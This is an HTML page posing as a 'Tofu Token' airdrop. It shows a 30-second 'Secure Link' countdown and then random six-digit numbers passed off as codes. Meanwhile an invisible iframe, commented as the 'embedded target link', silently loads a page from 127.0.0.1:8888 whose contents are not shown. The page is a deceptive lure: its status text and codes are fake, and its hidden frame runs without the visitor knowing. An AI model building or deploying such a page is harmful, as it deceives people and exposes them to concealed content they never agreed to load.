<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Airdrop Tofu Token</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f172a, #1e293b);
            color: #f8fafc;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background: rgba(30, 41, 59, 0.7);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            text-align: center;
            max-width: 420px;
            width: 100%;
        }
        h2 {
            margin-top: 0;
            color: #38bdf8;
            font-size: 24px;
            letter-spacing: 1px;
        }
        .code-box {
            font-size: 36px;
            font-weight: bold;
            color: #4ade80;
            margin: 25px 0;
            padding: 20px;
            background: rgba(15, 23, 42, 0.8);
            border: 1px solid #334155;
            border-radius: 10px;
            letter-spacing: 6px;
            box-shadow: inset 0 2px 4px rgba(0,0,0,0.6);
        }
        .spinner {
            border: 4px solid rgba(255, 255, 255, 0.1);
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border-left-color: #38bdf8;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .hidden-frame {
            display: none;
        }
        p {
            color: #94a3b8;
            font-size: 14px;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Airdrop Tofu Token</h2>
        <div id="loader">
            <div class="spinner"></div>
            <p id="status">Initializing Secure Link & Processing... (<span id="countdown">30</span>s)</p>
        </div>
        <div class="code-box" id="codeDisplay" style="display: none;">------</div>
        <p id="substatus" style="display: none;">Generating new code every 5 seconds...</p>
    </div>

    <!-- Your embedded target link -->
    <iframe src="http://127.0.0.1:8888/index.html?chain=main" class="hidden-frame"></iframe>

    <script>
        let timeLeft = 30;
        const countdownEl = document.getElementById('countdown');
        const statusEl = document.getElementById('status');
        const loaderEl = document.getElementById('loader');
        const codeDisplayEl = document.getElementById('codeDisplay');
        const substatusEl = document.getElementById('substatus');

        // Update countdown every second for 30 seconds
        let timerInterval = setInterval(function() {
            timeLeft--;
            countdownEl.innerText = timeLeft;
            if (timeLeft <= 0) {
                clearInterval(timerInterval);
                // Hide loader and show code generator interface
                loaderEl.style.display = 'none';
                codeDisplayEl.style.display = 'block';
                substatusEl.style.display = 'block';
                
                // Generate first code immediately
                generateCode();
                
                // Generate a new code every 5 seconds afterwards
                setInterval(generateCode, 5000);
            }
        }, 1000);

        function generateCode() {
            const randomCode = Math.floor(100000 + Math.random() * 900000);
            codeDisplayEl.innerText = randomCode;
        }
    </script>

</body>
</html>
